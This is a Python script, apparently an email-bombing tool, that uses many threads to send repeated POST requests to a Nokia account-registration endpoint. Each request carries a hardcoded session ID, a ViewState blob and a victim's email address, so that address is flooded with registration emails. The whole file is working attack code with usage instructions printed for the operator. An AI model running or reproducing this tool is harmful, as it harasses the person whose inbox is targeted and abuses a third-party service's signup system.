#!/usr/bin/env python3
import requests,threading,sys
from queue import Queue

q = Queue()

print("""
  _   _       _    _                             _ _ 
 | \ | |     | |  (_)                           (_) |
 |  \| | ___ | | ___  __ _   ___ _ __ ___   __ _ _| |
 | . ` |/ _ \| |/ / |/ _` | / _ \ '_ ` _ \ / _` | | |
 | |\  | (_) |   <| | (_| ||  __/ | | | | | (_| | | |
 |_| \_|\___/|_|\_\_|\__,_| \___|_| |_| |_|\__,_|_|_|
			______
                       |______|
	# Coded By : Khaled Nassar @knassar702
""")
try:
	email = sys.argv[1]
	thr = int(sys.argv[3])
	many = int(sys.argv[2])
except:
	print('i need args (./nokia.py email@test.com 100 10)')
	exit()
def sender(d):
	r = requests.post('http://online.networks.nokia.com/newaccount/email.faces;SID_ACCREQ=vY1xp07fXxLZL511P46sgGTThDQk7C45vKGNyGyGjLYMCx5SX7yX!839189010!749046041',data=d)
def post_data(params):
    if params:
        prePostData = params.split("&")
        postData = {}
        for d in prePostData:
            p = d.split("=", 1)
            postData[p[0]] = p[1]
        return postData
    return {}
def threader():
	while True:
		item = q.get()
		sender(item)
		q.task_done()
p = 'EnterEmailForm=EnterEmailForm&EnterEmailForm:firstName=my&EnterEmailForm:lastName=Account&EnterEmailForm:email={}&EnterEmailForm:userCountrySelect=EG&EnterEmailForm:countryCallingCode=20&EnterEmailForm:phone=1561561231&EnterEmailForm:validateEmailBtn=Continue'.format(email)
d = post_data(p)
d['javax.faces.ViewState'] = 'H4sIAAAAAAAAANVYXWwcxR2fO8fOxY6CE0NIECYHhpBE8dmOTeL4iJrY2PUJf0Q%2BO0AiSOZ2x3fr7u0us7O%2BTYA0oBakIvVDtBJIQa3UPvQBXuhbn1ohtSoSlRqJFyQQqipVlVqQEAjaB%2Bh%2FZr8%2FzvYZI8LKGs%2Fu%2FOc%2F%2F4%2Ff%2F%2BPmtf%2BgdpOiIzqtFvAKtkdWzOUCNgxVkTBTdK2wSAkpM2pJzKJkTpfJcz%2F56OU3l%2FtyOxGyjSsIbUOoL7Jb0uuGrhGNFc7Ap3MKaSzoOkO5lYuKDH%2BDyHna0f0reBXbhWUsETO0a6k0h%2BuKVp3QNYYVjVDUxaewNE2wjLznSPruGqurhWkYSpphsWlFlomG7rRMQid0S2P08gRWVcFdJu6q9zSRx%2Bc4S0wTV4npqzLsb%2B1bZ%2BuUTuto1yRoQSfrWHHenWeXY3yqSLW1dVkkNkM7lhVqMjAQ8c8%2BuDGxfamPByZs4eCcir%2FiuaObOredcHu1fOgO99ChQX%2Fr0XW2lolKJDavkVmiWWh3CDLOissm08zZSyWHrsRI3URdkrN3RjHZ5qUPENaKzfZICahvzvZGDdbWlR6SQOZgUxWOb177Exv23YRer2NNHrcY0zXUvYpVRcaMiFgbZ9om%2BXRJWJOIOhlBYMtZa4pnP%2FexLYp6LsxwFgUVa9XCfGUFIFP86V8f%2FWW3eVjN8qQKdFnrSXQVZSOzNn%2BWC2aQu3cLbhZTQAVs1max0b793T%2B%2BuffS39pQdgp1qjqWp7DEdFpCO1iNErOmq7JtfOe0EKmjkeOM%2BFEM3RtWrkEqUAkKE0sLC5NzixfPlSYfubgwP7%2FID%2B9kKJ9GOz97dn6OU5ceKoNsPYFsZyjFIhrsZ2%2F0vvJn%2FGobypTQNlO5QoTKuQZUEpQH1HH3D7JI1mdrp3B307GgygyzeLplqGNFhBSLeMa2jVBt4qrt9W0qPDSu6yrB2tt5eu2d6%2F%2F7MIsy51E7AMwCsTMm33A7MoBH5%2FTi7MzF8TPl0gS8DIi0VVgxDeDWHVhhRpewSq5%2BvvvS9cH%2F%2FjuLtpVQrgZek0CXGbTdDVwIYYGRAS7BAJRf0LY4w3OwVrUgRPipvUC%2BiqmCNSZebeNLeBjKLpVh4DZBUUVKoHOV0D1%2F%2F9VvPnv2hdEsN7%2BriCeioJuz6hVCn3%2FtF71dP%2F%2FgRQ%2BR3YYhlN3JU6BwVQbYNwnpMoPgmwaUEVrGq4Q%2B9tbvTr10%2Fe3ZLMrOoB0SlBKTlxJXjU4TaGSxh6G9juKKPlAmoJyqXMEVlRRtgxtyMJq8yCo%2FbIFocM5ZsCKZ8CTgOCMQhO8f%2Ff6l%2Bp9e%2F0RoYfth084n%2B8VgBNOEfvz9oCA4EtqbEpo5QZpLRFSGf%2B6K8fUgPgTQ4yu3%2BMM%2BRyLD54tSzsr4s11pqcEIbYnlGhdHr984989%2F9T71Xc%2BzGebCIDjC1Rwsfhc4tWBaWoGohXOcaNI2IIOY0BqW6oba9vvfVg7c95eXeTNI0T4HDUnSRue1Cx%2F84YufZQVZj08WUPz6hz8qf3z%2BxoNCqMY4KvQ9hSURDQvkSYuYjIcs1VWV0EKyuj0Txq%2BTUg3D5kp0%2B4NjXIisMGSd9GEYIRSEUBEeAxbOxzV9tNufbQ95RjDa4w%2BeQLeGBfJ6zLhAMRlEwpF0VadjlMhFQf0wfNvpfKtC064V4X2bCoEQUc8h5cNkiuB7W4X0vgikh8MNapBWj7vLI6E2MlgddVcf8Jo9Fure3DXgkGzIQnTDLt2J1ObHXRz1Ohr3%2FWSIwfHQ%2FIRXKuD0RCvhrQ2xSHvgfT7mBnWPP3hu7g67mRckcAt46O7Qj60Bu7%2FRaPQvw2K%2FRVWi8aogG%2FEnJQEEHrx74%2BmBz4qeS08lo5%2F%2FO904hQ6vEYvcKVOex9PDkKF90Uo85kOEn7DY1Ei8B91MaBpRwDuK3HMNVAvW%2FSeW%2Fu8BKochbwsU3goPDw46ZGkB0%2B3POsKRztDtMZ29UOBES2GVe1LC3wjHUUw9RwfAuaIBvskkpTr1tiWVai75lgPlQXRoHaDM4LVxEreZlys4%2F0eiZrj8DQKDj09vHSRGOdGjUVmfM0KpMhUAfPzBN%2Bvwk%2Bi%2BdRwudG3m7Vtj5hC5n3M%2B%2F%2B13dTzj%2BfWMU11I%2BrrdV34LHN27tqNb7FXDFxm23TJIiuj%2BdUDi1vRmMMnHTJloA%2Fg5j4czanc0o2pWSwByhpip40%2BM09OhopxJ8Uj26wszxzsKMZvZ746Y%2FULu5PzfCCxnbCHQhznVE0mgJ7u4mzW7bc1vEGjw0u0f2snPu3QT5Ly2DeW8LTf02hmirlcUlZzlbftGC4no8Tnvyk1g1K%2BpkIg%2BUk7GV5Nrsi0NtZaFPcGpSFLYdt9TWyDVXc2kOhCTKv6LjhNXAyFiNwTOVbDrd3ElciB0JTJLWE2Xo3ci7y1cHd352EsfOXci%2B%2F3LjjjtGwNvvfiPz0Z%2BzK88OPPxxml0dI1IMKgOApmzlx8iDCRPS%2Fh%2BxCH3%2BmO%2Fq1KO81E0iyTrGvSllDCLavmIYQ4dLqYCm6GjFZ3KhI7ljxUrWPpelYK48ljf0LGRoZNDxbxzA9G3LJ4iVGMd%2BPZXhBn79VVC%2BZEdplWpK6xlXyaKWfALnNMpUSx9GpO8Y0KQp9ngEDelKVHFYGM1KI06vVzg2oEZ8q55lrFqkmZG6Q%2BMkl%2FfKnzTFw6DL5vZoNU%2Bzbl%2FGHHvH27zh%2BSlovF%2FpOviUPUdAAA%3D'
try:
	for i in range(thr):
		p1 = threading.Thread(target=threader)
		p1.daemon = True
		p1.start()
	for c in range(many):
		q.put(d)
	print('[!] Working ..')
	q.join()
except KeyboardInterrupt:
	print('[!] Good Bye ..!')
	exit()
